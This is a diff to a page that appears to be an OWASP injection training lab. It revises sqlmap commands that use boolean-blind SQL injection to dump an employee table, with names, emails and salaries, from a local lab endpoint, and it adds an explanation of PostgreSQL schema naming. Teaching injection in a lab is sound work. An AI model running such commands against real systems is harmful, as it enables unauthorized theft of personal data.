@@ -99,18 +99,22 @@
         <p>From a shell with <code>sqlmap</code> installed:</p>
         <pre><code class="language-python">sqlmap -u "http://127.0.0.1:5001/a03/roster-lookup?id=1" \
   --batch --technique=B --level=1 --risk=1 \
-  -D owasp_lab -T a03_employees --dump</code></pre>
+  -D public -T a03_employees --dump</code></pre>
         <p>If automatic column enumeration doesn't succeed, provide the
         column names explicitly:</p>
         <pre><code class="language-python">sqlmap -u "http://127.0.0.1:5001/a03/roster-lookup?id=1" \
   --batch --technique=B --level=1 --risk=1 \
-  -D owasp_lab -T a03_employees -C id,name,email,department,salary --dump</code></pre>
+  -D public -T a03_employees -C id,name,email,department,salary --dump</code></pre>
         <p><code>--technique=B</code> tells sqlmap to use boolean-based
         blind extraction specifically (matching this endpoint's
         found/not-found signal), rather than trying every technique it
-        knows. Within a couple of minutes, sqlmap recovers every row of
-        the table on its own — the same data Task 2 took ~20 requests to
-        extract just one number of.</p>
+        knows. Note that <code>-D</code> here names the PostgreSQL
+        <em>schema</em>, not the database — the app connects to a
+        database named <code>owasp_lab</code>, but its tables live in the
+        default <code>public</code> schema, which is what sqlmap needs
+        for this flag. Within a couple of minutes, sqlmap recovers every
+        row of the table on its own — the same data Task 2 took ~20
+        requests to extract just one number of.</p>
       </div>
     </div>
   </li>
